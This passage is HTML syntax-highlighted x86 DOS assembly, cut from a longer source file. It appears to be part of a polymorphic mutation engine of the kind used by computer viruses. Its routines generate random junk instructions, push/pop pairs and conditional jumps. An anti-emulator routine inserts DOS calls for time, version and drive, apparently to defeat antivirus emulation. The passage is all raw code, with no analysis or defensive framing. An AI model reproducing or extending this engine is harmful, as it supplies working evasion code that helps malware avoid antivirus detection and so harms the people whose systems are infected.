        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6601h</span><span class="sc0">                        </span><span class="sc1">; get codepage</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getpsp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">                          </span><span class="sc1">; get psp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">intwithacd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">getbdrive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                          </span><span class="sc1">; ah=06h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc0">                         </span><span class="sc1">; mov dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">                         </span><span class="sc1">; ffh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">allocmem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                          </span><span class="sc1">; allocate mem</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc0">                         </span><span class="sc1">; in bx max mem avaiable</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                              </span><span class="sc1">; bx=ffffh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getbdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0b8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3305h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">storeandint</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">onlyahint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">okah</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getcdrive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">getveryfl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">                          </span><span class="sc1">; get stdin status</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getveryfl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc0">                         </span><span class="sc1">; get verify flag</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">storeandint</span><span class="sc0">
</span><span class="sc5">getcdrive</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc0">                         </span><span class="sc1">; get default drive</span><span class="sc0">
</span><span class="sc5">storeandint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">021cdh</span><span class="sc0">                       </span><span class="sc1">; int 21h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">look_4_int_jmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">icantint</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">icantint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_compare</span><span class="sc0">
</span><span class="sc5">icantint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">dopushpop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; increment the numba of pushes</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_segment_push</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                  </span><span class="sc1">; push es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">add_n_store</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                  </span><span class="sc1">; push cs</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">add_n_store</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                  </span><span class="sc1">; push ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">add_n_store</span><span class="sc0">
</span><span class="sc5">no_segment_push</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">50h</span><span class="sc0">                  </span><span class="sc1">; push a reg</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">add_n_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_foo_instructions</span><span class="sc0"> </span><span class="sc1">; some shit between</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">no_pop_segment</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                  </span><span class="sc1">; pop es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">es_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">try_pop_ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                  </span><span class="sc1">; cdanncaddacnjdcanjndca</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_pop</span><span class="sc0">
</span><span class="sc5">try_pop_ds</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                  </span><span class="sc1">; pop ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">ds_mody</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">store_pop</span><span class="sc0">
</span><span class="sc5">no_pop_segment</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">                  </span><span class="sc1">; pop with the selected one</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">store_pop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">push_nr</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; number of pushes curr. active</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">jumping_zone</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">      </span><span class="sc1">; lock jumping</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">conditional_jump</span><span class="sc0">
</span><span class="sc5">jump_short_crea</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc0">                         </span><span class="sc1">; jmp short</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_jump</span><span class="sc0">
</span><span class="sc5">conditional_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; jmp type</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc0">                          </span><span class="sc1">; jmp base</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc5">store_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; write jmp</span><span class="sc0">
</span><span class="sc5">retry_cond_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; where will jump</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_foo_instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">ok_lenght_jump</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">retry_cond_jump</span><span class="sc0">
</span><span class="sc5">ok_lenght_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; put the bytes to jump</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; reset both checks</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">random_foo_instructions</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">         </span><span class="sc1">; how much foo</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">random_foo_instructions</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">emu_trick</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_Adding</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">no_Adding</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_the_random</span><span class="sc0">           </span><span class="sc1">; generate foo instructions</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ob_oc</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">98h</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc0">  </span><span class="sc1">; one byters</span><span class="sc0">

</span><span class="sc5">one_byters</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ob_oc</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">do_antiemulator</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">cmp_check2</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">cont_antiemu</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_antiemu</span><span class="sc0">

</span><span class="sc5">cont_antiemu</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_bdrive</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">cant_use</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">; cx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">canuse</span><span class="sc0">
</span><span class="sc5">cant_use</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">end_antiemu</span><span class="sc0">
</span><span class="sc5">canuse</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_dos_ver</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">set_wrong_time</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">one_byters</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">do_a_call</span><span class="sc0">

</span><span class="sc5">set_wrong_time</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">withcl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0b5h</span><span class="sc0">                 </span><span class="sc1">; mov ch,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">get_rnd_tset</span><span class="sc0">
</span><span class="sc5">withcl</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc0">                 </span><span class="sc1">; mov cl,</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc0">
</span><span class="sc5">get_rnd_tset</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">get_rnd_tset</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                   </span><span class="sc1">; store the mov</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">  </span><span class="sc1">; enable no cx change</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random_foo_instructions</span><span class="sc0"> </span><span class="sc1">; garbage instructions</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0"> </span><span class="sc1">; enable cx changing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2db4h</span><span class="sc0">                </span><span class="sc1">; mov ah,2dh</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">                   </span><span class="sc1">; test al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; compare with 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                  </span><span class="sc1">; jne</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_and_jump</span><span class="sc0">



</span><span class="sc5">get_dos_ver</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">count_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc1">; bx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">point_reg</span><span class="sc4">],</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_antiemu</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">30b4h</span><span class="sc0">                </span><span class="sc1">; get dos version</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
